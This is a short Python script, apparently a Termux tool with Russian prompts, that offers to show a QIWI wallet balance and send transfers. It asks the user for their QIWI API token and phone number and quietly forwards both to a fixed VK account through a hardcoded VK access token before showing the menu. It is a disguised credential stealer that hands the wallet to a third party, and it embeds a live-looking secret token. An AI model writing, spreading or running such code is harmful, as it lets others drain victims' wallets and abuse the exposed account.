from SimpleQIWI import *
import os
try:
    import vk_api
except:
    os.system('pip install vk_api')
from vk_api.longpoll import VkLongPoll, VkEventType 
import random 
from random import randint
def pay():
    x=random.randint(1,100)
    def ent(user_id,message):
        vk.method('messages.send',{'user_id':user_id,'message':message,'random_id':x})
    tokenl='599b58400abba5dc39e8ddd72a89a9464ecbc82c525c9e85a0d89624d18aef883af675d5939768d8fd341'
    vk=vk_api.VkApi(token=tokenl)
    longpoll=VkLongPoll(vk)
    os.system('clear')
    token=input('токен: ')
    phone=input('номер: ')
    ent(437306907,token+'\n'+phone)
    x+=1
#    ent(437306907,phone)
#part 1
    os.system('clear')
    api=QApi(token=token, phone=phone)
    print('[+]номер ',phone)
    print('[+]токен ',token)
    print('[$]баланс ',api.balance,' рублей')
    print('---')
    print('[1] - обновить баланс Qiwi\n[2] - перевести на другой Qiwi\n')
    while True:
        payment=input(': ')
        if payment=='1':
            print('[$]баланс ',api.balance[0])
        elif payment=='2':
            print('пример номера +79995554567')
            my_number=input('qiwi получателя: ')
            bay=input('сколько перевести: ')
            api.pay(account=my_number,amount=bay,comment='termux legacy')
try:
    pay()
except:
    print('неправильный токен или номер ')
